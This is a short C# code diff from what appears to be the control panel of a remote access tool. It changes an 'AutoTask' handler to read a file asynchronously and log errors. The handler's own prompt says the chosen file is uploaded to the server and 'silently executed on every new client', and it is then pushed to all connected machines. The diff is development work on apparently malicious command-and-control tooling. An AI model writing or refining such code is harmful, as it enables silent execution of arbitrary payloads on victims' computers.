@@ -4461,7 +4461,7 @@ Read-Host 'Press Enter to close'
         return result == MessageBoxResult.Yes;
     }
 
-    private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
+    private async void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
     {
         var dlg = new Microsoft.Win32.OpenFileDialog
         {
@@ -4475,16 +4475,23 @@ Read-Host 'Press Enter to close'
             "The file will be uploaded to the server and silently executed on every new client."))
             return;
 
-        var fileBytes = File.ReadAllBytes(dlg.FileName);
-        var entry = new Data.AutoTaskEntry
+        try
         {
-            FileName = fileName,
-            FileBase64 = Convert.ToBase64String(fileBytes),
-            FileSize = fileBytes.Length
-        };
-        _autoTasks.Add(entry);
-        Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
-        _ = ExecuteAutoTasksForAllConnected();
+            var fileBytes = await File.ReadAllBytesAsync(dlg.FileName);
+            var entry = new Data.AutoTaskEntry
+            {
+                FileName = fileName,
+                FileBase64 = Convert.ToBase64String(fileBytes),
+                FileSize = fileBytes.Length
+            };
+            _autoTasks.Add(entry);
+            Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
+            _ = ExecuteAutoTasksForAllConnected();
+        }
+        catch (Exception ex)
+        {
+            Log($"[!] AutoTask: failed to read {fileName}: {ex.Message}");
+        }
     }
 
     private void AutoTask_BlockReset_Click(object sender, RoutedEventArgs e)
